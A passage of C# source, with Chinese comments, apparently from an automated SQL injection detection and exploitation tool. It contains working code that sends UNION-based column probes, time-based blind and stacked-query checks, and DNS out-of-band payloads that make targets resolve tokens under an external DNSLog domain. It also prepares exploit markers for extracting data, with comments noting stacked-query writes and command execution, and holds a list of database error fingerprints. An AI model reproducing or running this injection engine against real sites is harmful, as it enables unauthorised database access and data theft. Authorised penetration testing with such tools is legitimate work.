                    string oPayload = " ORDER BY " + c + comment;
                    HttpResponse oResp = await Send(ctx, reqTxt, oPayload).ConfigureAwait(false);
                    bool oFail = ConstData.ErrorHttpCode.Contains(oResp.StatusCode) || InjectTools.IsDbErrorPage(oResp.BodyTxt);
                    if (!oFail)
                    {
                        string oTxt = Clear(ctx, oResp.BodyTxt, ReflectionValue(prefix, oPayload, suffix));
                        oFail = PageLikeTool.CalculateSimilarity(ctx.Template, oTxt) < UnionBound;
                    }
                    if (oFail)
                    {
                        if (c > 1)
                        {
                            foundCount = c - 1;
                            Log.Show("ORDER BY路径定位列数=" + foundCount + "（第" + c + "列起报错/页面剧变）");
                        }
                        break;
                    }
                }
            }
            //1b. NULL/字符填充路径：ORDER BY不可用或未分出胜负时，按FROM变体逐个尝试
            if (foundCount < 0)
            {
                foreach (string fromDual in fromVariants)
                {
                    foundCount = await ProbeUnionColumns(ctx, reqTxt, charExpr, comment, fromDual, prefix, suffix, colStart, colStop, dbg).ConfigureAwait(false);
                    if (foundCount > 0)
                    {
                        usedFrom = fromDual;
                        break;
                    }
                }
            }
            if (foundCount < 0)
            {
                return null;
            }

            //2. 逐列定位显示位：单列替换为随机字符串，其余NULL（按FROM变体逐个尝试，ORDER BY路径拿到的列数不含FROM信息）
            int showCol = -1;
            foreach (string fromDual in (usedFrom != null ? new List<string> { usedFrom } : fromVariants))
            {
                showCol = await ProbeUnionShowColumn(ctx, reqTxt, comment, fromDual, prefix, suffix, foundCount).ConfigureAwait(false);
                if (showCol > 0)
                {
                    break;
                }
            }
            if (showCol < 0)
            {
                Log.Show("Union列数=" + foundCount + "但未找到可见显示位，跳过此边界！");
                return null;
            }

            Log.Warning("发现Union注入！用例：" + test.Title + "，列数=" + foundCount + "，显示位=" + showCol);
            InjectPayloadManager.RecordHit(test);
            InjectPoint inp = new InjectPoint();
            inp.IsInject = true;
            inp.InjectType = InjectType.Union;
            inp.DBType = ResolveDb(test, ctx);
            inp.SumColumnCount = foundCount;
            inp.ShowColumnIndex = showCol;
            inp.Where = where;
            inp.VectorTemplate = HasVectorSlot(test.Vector) ? test.Vector : "";
            inp.OrigValue = ctx.PValue ?? "";
            inp.UnionStartPayLoad = where == 3 && !string.IsNullOrEmpty(inp.VectorTemplate) ? "" : prefix + " and ";
            inp.Prefix = prefix; inp.Suffix = suffix;
            inp.Clause = string.Join(",", boundary.Clause);
            inp.PValue = ExploitMarkedValue(ctx, BaseValue(ctx, where, " UNION ALL SELECT "), prefix, suffix, inp.DBType, where, inp.VectorTemplate, ph);
            inp.RequestTxt = BuildRequest(ctx, inp.PValue);
            inp.PName = ctx.PName;
            inp.Place = ctx.Place;
            inp.UriIndex = ctx.UriIndex;
            inp.HeaderName = ctx.HeaderName;
            return inp;
        }

        /// <summary>
        /// Union列数定位（NULL/字符填充路径）：递增列数发送Union探针，
        /// 字符填充看回显、NULL填充看相似度+列数+1反证；返回列数，未定位返回-1
        /// </summary>
        private static async Task<int> ProbeUnionColumns(Ctx ctx, string reqTxt, string? charExpr, string comment,
            string fromDual, string prefix, string suffix, int colStart, int colStop, bool dbg)
        {
            for (int c = colStart; c <= colStop; c++)
            {
                ctx.Config.CheckStop();
                string payload = " UNION ALL SELECT " + string.Join(",", Enumerable.Range(1, c).Select(_ => charExpr)) + fromDual + comment;
                HttpResponse resp = await Send(ctx, reqTxt, payload).ConfigureAwait(false);
                if (ConstData.ErrorHttpCode.Contains(resp.StatusCode) || InjectTools.IsDbErrorPage(resp.BodyTxt))
                {
                    //错误页（含DB错误指纹）跳过：错误消息中的截断SQL反射会残留探针串导致误判
                    if (dbg)
                    {
                        Log.Show($"[DBG] Union列数探测 c={c} from='{fromDual}' 被判错误页跳过 状态={resp.StatusCode}");
                    }
                    continue;
                }
                string txt = Clear(ctx, resp.BodyTxt, ReflectionValue(prefix, payload, suffix));
                bool hit;
                if (charExpr != null && charExpr.StartsWith('\''))
                {
                    //字符填充：列数正确时填充字符串会出现在查询结果中（已剔除payload回显）
                    hit = txt.Contains(charExpr.Trim('\''), StringComparison.Ordinal);
                    if (dbg)
                    {
                        Log.Show($"[DBG] Union字符填充 c={c} from='{fromDual}' hit={hit} txtLen={txt?.Length} 状态={resp.StatusCode}");
                    }
                }
                else
                {
                    double ratio = PageLikeTool.CalculateSimilarity(ctx.Template, txt);
                    hit = ratio >= UnionBound;
                    if (dbg)
                    {
                        Log.Show($"[DBG] Union列数探测 c={c} from='{fromDual}' ratio={ratio:F4} tplLen={ctx.Template?.Length} txtLen={txt?.Length}");
                    }
                    if (hit)
                    {
                        //列数+1反证：必须不再匹配，否则页面无法区分列数（可能错误被抑制），放弃此边界
                        string payloadNext = " UNION ALL SELECT " + string.Join(",", Enumerable.Range(1, c + 1).Select(_ => charExpr)) + fromDual + comment;
                        HttpResponse respNext = await Send(ctx, reqTxt, payloadNext).ConfigureAwait(false);
                        string txtNext = Clear(ctx, respNext.BodyTxt, ReflectionValue(prefix, payloadNext, suffix));
                        double ratioNext = PageLikeTool.CalculateSimilarity(ctx.Template, txtNext);
                        if (ratioNext >= UnionBound)
                        {
                            return -1;
                        }
                    }
                }
                if (hit)
                {
                    return c;
                }
            }
            return -1;
        }

        /// <summary>
        /// Union显示位定位：单列替换为随机字符串，其余NULL。
        /// probe用40字符长串：避免短文本列（varchar(20)等）截断数据时误选为显示位。
        /// 全NULL基准页：PG等严格类型库中文本probe落到数字列会报错，
        /// 错误消息含probe反射，仅判断probe出现会误判；要求页面与全NULL基准相似才认定该列真实可见
        /// </summary>
        private static async Task<int> ProbeUnionShowColumn(Ctx ctx, string reqTxt, string comment,
            string fromDual, string prefix, string suffix, int foundCount)
        {
            string probe = MyTools.RandStr(40).ToLower();
            string nullCols = string.Join(",", Enumerable.Repeat("NULL", foundCount));
            string nullPayload = " UNION ALL SELECT " + nullCols + fromDual + comment;
            HttpResponse nullResp = await Send(ctx, reqTxt, nullPayload).ConfigureAwait(false);
            if (ConstData.ErrorHttpCode.Contains(nullResp.StatusCode) || InjectTools.IsDbErrorPage(nullResp.BodyTxt))
            {
                return -1;
            }
            string nullTxt = Clear(ctx, nullResp.BodyTxt, ReflectionValue(prefix, nullPayload, suffix));
            for (int i = 1; i <= foundCount; i++)
            {
                ctx.Config.CheckStop();
                string cols = string.Join(",", Enumerable.Range(1, foundCount).Select(x => x == i ? "'" + probe + "'" : "NULL"));
                string payload = " UNION ALL SELECT " + cols + fromDual + comment;
                HttpResponse resp = await Send(ctx, reqTxt, payload).ConfigureAwait(false);
                if (ConstData.ErrorHttpCode.Contains(resp.StatusCode) || InjectTools.IsDbErrorPage(resp.BodyTxt))
                {
                    continue;
                }
                string txt = Clear(ctx, resp.BodyTxt, ReflectionValue(prefix, payload, suffix));
                double ratioToNull = PageLikeTool.CalculateSimilarity(nullTxt, txt);
                //小页面（全NULL基准<512字节）相似度比对失真：40字符probe占比过大必然低于阈值，
                //放宽为probe出现+错误页已排除+基准页不含probe（防错误反射误判）
                bool smallPage = (nullTxt?.Length ?? 0) < 512;
                if (txt.Contains(probe, StringComparison.Ordinal) && (ratioToNull >= UnionBound || (smallPage && !(nullTxt?.Contains(probe, StringComparison.Ordinal) ?? false))))
                {
                    return i;
                }
            }
            return -1;
        }

        /// <summary>
        /// 时间盲注/堆叠查询：三次确认（基准延时→变时复测→零延时对照），多轮确认逻辑
        /// </summary>
        private static async Task<InjectPoint?> TryTime(Ctx ctx, PayloadTest test, PayloadBoundary boundary, int where, bool stacked)
        {
            int baseSec = await EnsureBaseSec(ctx).ConfigureAwait(false);
            int time = Math.Max(1, baseSec + 1);
            if (ctx.Config.TimeOut < time + 3)
            {
                ctx.Config.TimeOut = time + 5;
            }
            PayloadPlaceholder ph = new PayloadPlaceholder(time);
            string prefix = Rep(ctx, ph, boundary.Prefix);
            string suffix = Rep(ctx, ph, boundary.Suffix);
            string comment = Rep(ctx, ph, test.RequestComment);
            string payload = Rep(ctx, ph, test.RequestPayload) + comment;
            string reqTxt = BuildRequest(ctx, MarkedValue(ctx, BaseValue(ctx, where, payload), prefix, suffix));
            bool canSetTime = (test.RequestPayload ?? "").Contains("[SLEEPTIME]", StringComparison.Ordinal);

            //第1次：基准延时
            HttpResponse resp = await Send(ctx, reqTxt, payload).ConfigureAwait(false);
            if (resp.RunTime < time * 1000 - MyTools.deviation || resp.RunTime >= ctx.Config.TimeOut * 1000L)
            {
                return null;
            }
            //第2次：变时复测，响应时间应同步变长（证明延时受控而非网络抖动）
            bool confirm2;
            if (canSetTime)
            {
                int time2 = time + 2;
                PayloadPlaceholder ph2 = new PayloadPlaceholder(time2);
                string prefix2 = Rep(ctx, ph2, boundary.Prefix);
                string suffix2 = Rep(ctx, ph2, boundary.Suffix);
                string payload2 = Rep(ctx, ph2, test.RequestPayload) + Rep(ctx, ph2, test.RequestComment);
                string reqTxt2 = BuildRequest(ctx, MarkedValue(ctx, BaseValue(ctx, where, payload2), prefix2, suffix2));
                HttpResponse resp2 = await Send(ctx, reqTxt2, payload2).ConfigureAwait(false);
                confirm2 = resp2.RunTime > time2 * 1000 - MyTools.deviation;
            }
            else
            {
                HttpResponse resp2 = await Send(ctx, reqTxt, payload).ConfigureAwait(false);
                confirm2 = resp2.RunTime > time * 1000 - MyTools.deviation;
            }
            if (!confirm2)
            {
                return null;
            }
            //基线抖动大：追加一轮基准延时确认，排除慢响应是网络抖动造成（高延迟目标的重复确认）
            if (ctx.BaseJitterMs > 1000)
            {
                HttpResponse respX = await Send(ctx, reqTxt, payload).ConfigureAwait(false);
                if (respX.RunTime < time * 1000 - MyTools.deviation)
                {
                    Log.Show("基线抖动大且追加确认未达标，判定为误报，跳过此payload！");
                    return null;
                }
            }
            //第3次：零延时对照，响应应快速返回（证明延时确实由payload引起）
            HttpResponse? resp0 = null;
            if (canSetTime)
            {
                PayloadPlaceholder ph0 = new PayloadPlaceholder(0);
                string prefix0 = Rep(ctx, ph0, boundary.Prefix);
                string suffix0 = Rep(ctx, ph0, boundary.Suffix);
                string payload0 = Rep(ctx, ph0, test.RequestPayload) + Rep(ctx, ph0, test.RequestComment);
                string reqTxt0 = BuildRequest(ctx, MarkedValue(ctx, BaseValue(ctx, where, payload0), prefix0, suffix0));
                resp0 = await Send(ctx, reqTxt0, payload0).ConfigureAwait(false);
                if (resp0.RunTime > time * 1000 - MyTools.deviation)
                {
                    Log.Show("零延时对照响应仍然缓慢，判定为误报，跳过此payload！");
                    return null;
                }
            }

            string techName = stacked ? "堆叠查询" : "时间盲注";
            Log.Warning("发现" + techName + "注入！用例：" + test.Title + "，延时=" + time + "秒");
            InjectPayloadManager.RecordHit(test);
            InjectPoint inp = new InjectPoint();
            inp.IsInject = true;
            //堆叠命中单独标记Stacked类型：取数回退时间盲注（BoolInjectType.Time已携带），写操作/命令执行走堆叠直发；
            //纯时间盲注命中标记独立的InjectType.Time（BoolInjectType.Time保留作oracle信息，判定经EffectiveBoolType强制走时间）
            inp.InjectType = stacked ? InjectType.Stacked : InjectType.Time;
            inp.BoolInjectType = BoolInjectType.Time;
            inp.CheckValue = time.ToString();
            inp.DBType = ResolveDb(test, ctx);
            inp.TestPayload = payload;
            inp.Where = where;
            //堆叠记录不启用vector模式：写操作/命令执行的堆叠直发与取数回退时间盲注均依赖and胶水标记
            inp.VectorTemplate = !stacked && HasVectorSlot(test.Vector) ? test.Vector : "";
            inp.OrigValue = ctx.PValue ?? "";
            inp.UnionStartPayLoad = where == 3 && !string.IsNullOrEmpty(inp.VectorTemplate) ? "" : prefix + " and ";
            inp.Prefix = prefix; inp.Suffix = suffix;
            inp.Clause = string.Join(",", boundary.Clause);
            inp.PValue = ExploitMarkedValue(ctx, BaseValue(ctx, where, payload), prefix, suffix, inp.DBType, where, inp.VectorTemplate, ph);
            inp.RequestTxt = BuildRequest(ctx, inp.PValue);
            inp.PName = ctx.PName;
            inp.Place = ctx.Place;
            inp.UriIndex = ctx.UriIndex;
            inp.HeaderName = ctx.HeaderName;
            //防脏数据校验基线：时间通道真值=延时响应码、假值=零延时对照码（无对照时与真值同码）
            inp.TrueCode = resp.StatusCode;
            inp.FalseCode = resp0 != null ? resp0.StatusCode : resp.StatusCode;
            Log.Success("存在" + techName + "payload：" + payload);
            return inp;
        }

        /// <summary>
        /// DNS外带探测（本工具扩展能力）：每条用例携带唯一token（payload中injectstr.domain占位符
        /// 替换为 token.DNSLog域名），全部发完后统一轮询DNSLog平台，回收到token解析记录即确认注入。
        /// 不依赖页面响应与延时，可发现无回显无延时的盲注点；需开启"DNS外带探测"开关且配置DNSLog域名+API Token。
        /// </summary>
        private static async Task<InjectPoint?> TryDnsOob(Ctx ctx, int level, int risk)
        {
            string domain = ctx.Config.DataConfig.DnsLogDomain?.Trim ()?? "";
            string apiToken = ctx.Config.DataConfig.DnsLogApiToken?.Trim ()?? "";
            if (string.IsNullOrEmpty(domain) || string.IsNullOrEmpty(apiToken))
            {
                Log.Warning("DNS外带探测已开启，但未配置DNSLog域名或API Token（网络设置→DNS数据接收），跳过DNS外带探测！");
                return null;
            }
            List<PayloadTest> tests = InjectPayloadLoader.GetDnsTests(level, risk)
                .OrderBy(t => t.Level).ThenBy(t => t.Risk).ToList();
            if (tests.Count == 0)
            {
                return null;
            }
            Log.Show("正在进行DNS外带探测检测（" + tests.Count + "个用例，域名=" + domain + "）……");
            //先全部发出（每条携带唯一token），再统一轮询，避免逐条等待平台回收
            var pending = new List<(string token, PayloadTest test, int where, string prefix, string suffix, string payload, string clause)>();
            var tokenSet = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
            foreach (PayloadTest test in tests)
            {
                ctx.Config.CheckStop();
                if (!DbmsMatch(test, ctx.DbCandidates))
                {
                    continue;
                }
                foreach (PayloadBoundary boundary in MatchBoundaries(test, level, ctx.Ptypes))
                {
                    ctx.Config.CheckStop();
                    foreach (int where in test.Where)
                    {
                        if (!boundary.Where.Contains(where))
                        {
                            continue;
                        }
                        string token = MyTools.RandStr(6).ToLower();
                        if (!tokenSet.Add(token))
                        {
                            continue;
                        }
                        PayloadPlaceholder ph = new PayloadPlaceholder();
                        string prefix = Rep(ctx, ph, boundary.Prefix);
                        string suffix = Rep(ctx, ph, boundary.Suffix);
                        //injectstr.domain为dns_blind.xml占位符：injectstr→唯一token，domain→配置的DNSLog域名
                        string payload = (Rep(ctx, ph, test.RequestPayload) + Rep(ctx, ph, test.RequestComment))
                            .Replace("injectstr.domain", token + "." + domain, StringComparison.Ordinal);
                        string reqTxt = BuildRequest(ctx, MarkedValue(ctx, BaseValue(ctx, where, payload), prefix, suffix));
                        await Send(ctx, reqTxt, payload).ConfigureAwait(false);
                        pending.Add((token, test, where, prefix, suffix, payload, string.Join(",", boundary.Clause)));
                        Log.Show("DNS外带探测已发送：" + test.Title + "（等待解析 " + token + "." + domain + "）");
                    }
                }
            }
            if (pending.Count == 0)
            {
                return null;
            }
            Log.Show("DNS外带探测payload已全部发出，开始轮询DNSLog平台回收解析记录（最长25秒）……");
            HashSet<string> hitTokens = await DnsExfilTool.PollDnsLogForTokens(ctx.Config, tokenSet, 25).ConfigureAwait(false);
            if (hitTokens.Count == 0)
            {
                Log.Show("DNS外带探测未回收到任何解析记录（目标不出网/用例不适用/平台延迟），未命中！");
                return null;
            }
            var hit = pending.First(p => hitTokens.Contains(p.token));
            Log.Warning("发现DNS外带注入！用例：" + hit.test.Title + "，token=" + hit.token + " 已在DNSLog平台回收到解析记录");
            InjectPayloadManager.RecordHit(hit.test);
            PayloadPlaceholder eph = new PayloadPlaceholder();
            InjectPoint inp = new InjectPoint();
            inp.IsInject = true;
            inp.InjectType = InjectType.Dns;
            //DNS外带取数本身不经页面判断；BoolInjectType仅作oracle信息占位，判断值由取数前"查找判断值"补齐
            inp.BoolInjectType = BoolInjectType.KeyWord;
            inp.CheckValue = "";
            inp.DBType = ResolveDb(hit.test, ctx);
            inp.TestPayload = hit.payload;
            inp.Where = hit.where;
            inp.VectorTemplate = HasVectorSlot(hit.test.Vector) ? hit.test.Vector : "";
            inp.OrigValue = ctx.PValue ?? "";
            inp.UnionStartPayLoad = hit.where == 3 && !string.IsNullOrEmpty(inp.VectorTemplate) ? "" : hit.prefix + " and ";
            inp.Prefix = hit.prefix; inp.Suffix = hit.suffix;
            inp.Clause = hit.clause;
            inp.PValue = ExploitMarkedValue(ctx, BaseValue(ctx, hit.where, hit.payload), hit.prefix, hit.suffix, inp.DBType, hit.where, inp.VectorTemplate, eph);
            inp.RequestTxt = BuildRequest(ctx, inp.PValue);
            inp.PName = ctx.PName;
            inp.Place = ctx.Place;
            inp.UriIndex = ctx.UriIndex;
            inp.HeaderName = ctx.HeaderName;
            Log.Success("存在DNS外带payload：" + hit.payload);
            Log.Warning("DNS外带记录未携带判断值：取数前请在数据操作页用“查找判断值”配置该点判断值（或确保目标持续出网走DNS外带取数）！");
            return inp;
        }

        /// <summary>
        /// 测量基线响应时间（5次采样，取最大向上取整到秒，并记录抖动），时间类检测前惰性计算。
        /// 延迟自适应：基线高（网络慢/目标慢）时告警，抖动大时TryTime增加一轮确认
        /// </summary>
        private static async Task<int> EnsureBaseSec(Ctx ctx)
        {
            if (ctx.BaseSec >= 0)
            {
                return ctx.BaseSec;
            }
            int max = 0;
            int min = int.MaxValue;
            for (int i = 0; i < 5; i++)
            {
                ctx.Config.CheckStop();
                HttpResponse resp = await HTTPTool.SendRequestRetryAsync(new HttpRequest(ctx.Config, ctx.BaseReq.HeaderAndBody)).ConfigureAwait(false);
                if (resp.RunTime > max)
                {
                    max = (int)resp.RunTime;
                }
                if (resp.RunTime < min && resp.RunTime > 0)
                {
                    min = (int)resp.RunTime;
                }
            }
            if (min == int.MaxValue)
            {
                min = max;
            }
            ctx.BaseJitterMs = max - min;
            ctx.BaseSec = (int)Math.Ceiling(max / 1000.0);
            Log.Show("基线响应时间约" + max + "毫秒（抖动" + ctx.BaseJitterMs + "毫秒），时间类检测延时设置为" + Math.Max(1, ctx.BaseSec + 1) + "秒！");
            if (ctx.BaseSec >= 2)
            {
                Log.Warning("目标基线响应较慢（>" + ctx.BaseSec + "秒），时间盲注判定误差增大，建议调大超时或使用布尔/Union通道！");
            }
            if (ctx.BaseJitterMs > 1000)
            {
                Log.Warning("目标响应时间抖动较大（" + ctx.BaseJitterMs + "毫秒），时间类检测将追加一轮确认防误报！");
            }
            return ctx.BaseSec;
        }

        /// <summary>
        /// 清理页面：剔除动态区域 + 剔除payload回显（原文及URL编码形态）
        /// </summary>
        private static string Clear(Ctx ctx, string? page, string payload)
        {
            string txt = WebPageDiffAnalyzer.ClearDynamicText(ctx.Features, page ?? "");
            return InjectTools.StripPayloadReflection(txt, payload);
        }

        /// <summary>
        /// 检测阶段标记：原值+&lt;Encode&gt;前缀+$sql$+后缀&lt;/Encode&gt;（发送时$sql$替换为解析后的payload）。
        /// 前后缀必须放在Encode块内：boundary前后缀可能含空格（如' WHERE 5454=5454、 AND (5454=5454），
        /// 放在块外会原样进入请求行导致URL非法。
        /// 同时按forgePayload规则在前缀后补空格：payload无前导空格（如AND [RANDNUM]=[RANDNUM]），
        /// 前缀为空或以引号/括号结尾时需要补一个空格才能拼出合法SQL。
        /// 编码策略不在标记期分叉：统一Encode块，发送期按块位置（请求行/urlencoded体=编码，头/JSON/XML/multipart体=原文）推断。
        /// </summary>
        private static string MarkedValue(Ctx ctx, string pvalue, string prefix, string suffix)
        {
            return (pvalue ?? "") + ConstData.StartPoint + FixPrefix(prefix) + ConstData.InjectStr + suffix + ConstData.EndPoint;
        }

        /// <summary>
        /// 启发式探针/checkDynParam用的探针标记值：原值+&lt;Encode&gt;$sql$&lt;/Encode&gt;
        /// </summary>
        private static string? ProbeMarkedValue(Ctx ctx)
        {
            return ctx.PValue + ConstData.GetParamAndEncode("");
        }

        /// <summary>
        /// 前缀规整：前缀不以空格/(结尾时补一个空格（forgePayload 同款规则）。
        /// 检测发送与回显剔除必须使用同一份规整结果，保证反射串能被完整剔除。
        /// </summary>
        private static string FixPrefix(string prefix)
        {
            string prefixFixed = prefix ?? "";
            if (!prefixFixed.EndsWith(' ') && !prefixFixed.EndsWith('('))
            {
                prefixFixed += " ";
            }
            return prefixFixed;
        }

        /// <summary>
        /// 页面中回显的完整注入串=规整前缀+payload+后缀（参数原值保留用于与模板对齐，不能剔除）。
        /// 只剔payload会把boundary前后缀（如" AND (5454=5454"、"-- xxxxx"）留在页面里，把真值页ratio压到阈值以下。
        /// </summary>
        private static string ReflectionValue(string prefix, string payload, string suffix)
        {
            return FixPrefix(prefix) + (payload ?? "") + (suffix ?? "");
        }

        /// <summary>
        /// 从页面模板词表中挑选盲注判断关键字：必须在真值原文出现、假值原文不出现（反向则相反）。
        /// 直接在原始响应上验证，可排除被payload回显（href里的注入串）污染的候选词；
        /// 长词、含字母的词优先，避免选中纯数字短词被后续取数payload的回显干扰。
        /// </summary>
        private static string? FindBlindKey(string template, string? trueBody, string? falseBody, out bool revers)
        {
            revers = false;
            if (string.IsNullOrEmpty(template) || string.IsNullOrEmpty(trueBody) || string.IsNullOrEmpty(falseBody))
            {
                return "";
            }
            List<string> words = Regex.Split(template, @"[^-￿\w\d]+")
                .Where(w => w.Length > 0)
                .Distinct()
                .OrderByDescending(w => w.Length)
                .ThenByDescending(w => w.Any(char.IsLetter))
                .ToList();
            foreach (string w in words)
            {
                if (trueBody.Contains(w, StringComparison.Ordinal) && !falseBody.Contains(w, StringComparison.Ordinal))
                {
                    return w;
                }
            }
            foreach (string w in words)
            {
                if (!trueBody.Contains(w, StringComparison.Ordinal) && falseBody.Contains(w, StringComparison.Ordinal))
                {
                    revers = true;
                    return w;
                }
            }
            return "";
        }

        /// <summary>
        /// 利用阶段标记：统一使用 and 胶水与后续取数payload衔接（取数payload如"1=2 union all select ..."不带前导关键字），
        /// 按数据库追加注释收尾；无注释时将boundary后缀保留在编码段内保证括号配平。
        /// 前缀同样在Encode块内（可能含空格，见MarkedValue说明）。
        /// where=3（参数整体替换）时按用例语义改用检出用例的vector模板：prefixQuery/suffixQuery对WHERE.REPLACE
        /// 均跳过boundary前后缀，取数条件/数据表达式直接进vector的[INFERENCE]/[QUERY]槽位，仅按库追加注释。
        /// </summary>
        private static string ExploitMarkedValue(Ctx ctx, string pvalue, string prefix, string suffix, DBType db,
            int where = 1, string vectorTemplate = "", PayloadPlaceholder? ph = null)
        {
            string? bakedVector = null;
            if (where == 3 && !string.IsNullOrWhiteSpace(vectorTemplate))
            {
                string? baked = BakeVector(ctx, ph, vectorTemplate);
                if (!string.IsNullOrEmpty(baked))
                {
                    bakedVector = baked;
                }
            }
            //where!=3或vector无取数槽位时走and胶水路径（bakedVector=null）
            return BakeExploitMarkedValue(pvalue, prefix, suffix, db, bakedVector);
        }

        /// <summary>
        /// 利用标记烘焙（与检测期ExploitMarkedValue同一语义，供恢复注入记录时按结构化字段重烘焙）：
        /// 基底值 + Encode块（前缀+and $sql$+注释+后缀，或已渲染vector+注释）。
        /// 编码策略统一Encode块，发送期按块位置推断是否URL编码（见StringReplace.IsRawPosition）。
        /// </summary>
        public static string BakeExploitMarkedValue(string baseValue, string prefix, string suffix, DBType db, string? bakedVectorOrNull)
        {
            string comment = db switch
            {
                DBType.MySQL => "#",
                DBType.Access => "",
                DBType.UnKnow => "",
                _ => "-- "
            };
            string inner;
            if (bakedVectorOrNull != null)
            {
                inner = bakedVectorOrNull + comment;
            }
            else
            {
                string tail = string.IsNullOrEmpty(comment) ? (suffix ?? "") : (comment + (suffix ?? ""));
                inner = (prefix ?? "") + " and " + ConstData.InjectStr + tail;
            }
            return (baseValue ?? "") + ConstData.StartPoint + inner + ConstData.EndPoint;
        }

        /// <summary>
        /// 恢复期vector烘焙（无检测上下文）：[INFERENCE]/[QUERY]替换为$sql$，其余占位符用全新随机占位符渲染，
        /// [ORIGVALUE]用记录的原参数值。模板无取数槽位时返回null（调用方回退and胶水路径）。
        /// </summary>
        public static string? BakeVectorForRestore(string? vectorTemplate, string? origValue)
        {
            string v = vectorTemplate ?? "";
            if (!HasVectorSlot(v))
            {
                return null;
            }
            v = v.Replace("[INFERENCE]", ConstData.InjectStr, StringComparison.Ordinal).Replace("[QUERY]", ConstData.InjectStr, StringComparison.Ordinal);
            return new PayloadPlaceholder().Replace(v).Replace("[ORIGVALUE]", origValue ?? "", StringComparison.Ordinal);
        }

        /// <summary>vector模板是否含取数槽位（[INFERENCE]条件槽/[QUERY]报错数据槽）</summary>
        private static bool HasVectorSlot(string vectorTemplate)
        {
            return !string.IsNullOrWhiteSpace(vectorTemplate)
                && (vectorTemplate.Contains("[INFERENCE]", StringComparison.Ordinal) || vectorTemplate.Contains("[QUERY]", StringComparison.Ordinal));
        }

        /// <summary>
        /// 烘焙where=3参数替换点的vector模板为利用标记：
        /// [INFERENCE]（布尔/时间条件槽）与[QUERY]（报错数据表达式槽）统一替换为发送期标记$sql$，
        /// 其余占位符（[RANDNUM]/[SLEEPTIME]/[DELIMITER_START]/[ORIGVALUE]等）按检测时同一上下文渲染。
        /// 模板无取数槽位时返回空串（调用方回退and胶水路径）。
        /// </summary>
        private static string? BakeVector(Ctx ctx, PayloadPlaceholder? ph, string? vectorTemplate)
        {
            string v = vectorTemplate ?? "";
            if (!v.Contains("[INFERENCE]", StringComparison.Ordinal) && !v.Contains("[QUERY]", StringComparison.Ordinal))
            {
                return "";
            }
            v = v.Replace("[INFERENCE]", ConstData.InjectStr, StringComparison.Ordinal).Replace("[QUERY]", ConstData.InjectStr, StringComparison.Ordinal);
            return Rep(ctx, ph ?? new PayloadPlaceholder(), v);
        }

        /// <summary>
        /// 按注入位置把标记值写回请求文本：Query/BodyForm重组参数；Cookie/Header改头；BodyJson改JSON体
        /// </summary>
        private static string BuildRequest(Ctx ctx, string? markedValue)
        {
            switch (ctx.Place)
            {
                case ParamPlace.Uri:
                    return RequestRewriter.SetInjectUriSegment(ctx.BaseReq.HeaderAndBody, ctx.UriIndex, markedValue);
                case ParamPlace.Cookie:
                    return RequestRewriter.SetInjectCookie(ctx.BaseReq.HeaderAndBody, ctx.PName, markedValue);
                case ParamPlace.Header:
                    return RequestRewriter.SetInjectHeader(ctx.BaseReq.HeaderAndBody, ctx.HeaderName, markedValue);
                case ParamPlace.BodyJson:
                    return RequestRewriter.SetInjectJsonBody(ctx.BaseReq.HeaderAndBody, ctx.PName, markedValue);
                case ParamPlace.BodyXml:
                    return RequestRewriter.SetInjectXmlBody(ctx.BaseReq.HeaderAndBody, ctx.PName, markedValue);
                case ParamPlace.BodyMultipart:
                    return RequestRewriter.SetInjectMultipart(ctx.BaseReq.HeaderAndBody, ctx.PName, markedValue);
                default:
                    return RequestRewriter.SetInjectToRequest(ctx.BaseReq.HeaderAndBody, RequestRewriter.SetInject(ctx.BaseReq.Params, ctx.PName, markedValue));
            }
        }

        private static async Task<HttpResponse> Send(Ctx ctx, string requestTxt, string payload)
        {
            HttpRequest hr = new HttpRequest(ctx.Config, requestTxt);
            hr.Payload = payload;
            return await HTTPTool.SendRequestRetryAsync(hr).ConfigureAwait(false);
        }

        /// <summary>
        /// SQL语法错误指纹：用于识别boundary拼接产生的非法SQL（区别于报错注入期望的数据型报错）
        /// </summary>
        private static readonly string[] SyntaxErrorKeys = {
            "SQL syntax", "syntax to use near",            // MySQL
            "syntax error at or near",                     // PostgreSQL/Kingbase
            "Incorrect syntax", "Unclosed quotation mark", // SQLServer
            "ORA-00907", "ORA-00917", "ORA-00923", "ORA-00933", // Oracle
            "near \".*\": syntax error",                   // SQLite
            "语法错误", "附近出现错误"                       // 达梦等国产库
        };

        private static bool IsSyntaxErrorPage(string? body)
        {
            if (string.IsNullOrEmpty(body))
            {
                return false;
            }
            foreach (string key in SyntaxErrorKeys)
            {
                if (Regex.IsMatch(body, key, RegexOptions.IgnoreCase))
                {
                    return true;
                }
            }
            return false;
        }

        /// <summary>
        /// boundary矩阵过滤：level/ptype/clause 三项匹配（where在主循环按单值逐一匹配；
        /// clause中[0]为通配符，双方都非[0]时才要求交集）
        /// </summary>
        private static IEnumerable<PayloadBoundary> MatchBoundaries(PayloadTest test, int level, int[] ptypes)
        {
            bool testClauseAny = test.Clause.Count == 1 && test.Clause[0] == 0;
            foreach (PayloadBoundary b in InjectPayloadLoader.GetBoundaries().Where(b => b.Level <= level).OrderBy(b => b.Level))
            {
                if (!ptypes.Contains(b.Ptype))
                {
                    continue;
                }
                bool boundClauseAny = b.Clause.Count == 1 && b.Clause[0] == 0;
                if (!testClauseAny && !boundClauseAny && !test.Clause.Intersect(b.Clause).Any())
                {
                    continue;
                }
                yield return b;
            }
        }

        /// <summary>
        /// 按test.where语义计算注入前的参数基底值（agent.payload 语义）：
        /// 1=ORIGINAL保留原值；2=NEGATIVE换成负随机数（让原查询无结果）；3=REPLACE整体替换
        /// </summary>
        private static string BaseValue(Ctx ctx, int where, string payload)
        {
            switch (where)
            {
                case 3:
                    return "";
                case 2:
                    return (payload ?? "").StartsWith('-') ? "" : "-" + new Random().Next(1000, 99999);
                default:
                    return ctx.PValue ?? "";
            }
        }

        /// <summary>
        /// 占位符替换 + [ORIGVALUE]（原参数值，Parameter replace类用例使用）
        /// </summary>
        private static string Rep(Ctx ctx, PayloadPlaceholder ph, string? template)
        {
            return ph.Replace(template).Replace("[ORIGVALUE]", ctx.PValue ?? "", StringComparison.Ordinal);
        }

        /// <summary>
        /// DBMS指纹过滤：命中指纹后，dbms专属用例必须匹配指纹库（含国产库兼容映射）；通用用例（dbms为空）始终执行
        /// </summary>
        private static bool DbmsMatch(PayloadTest test, List<DBType> candidates)
        {
            DBType exclude = DbmsNameToDbType(test.DbmsExclude);
            if (exclude != DBType.UnKnow && candidates.Any(c => c == exclude || CompatDb(c) == exclude))
            {
                return false;
            }
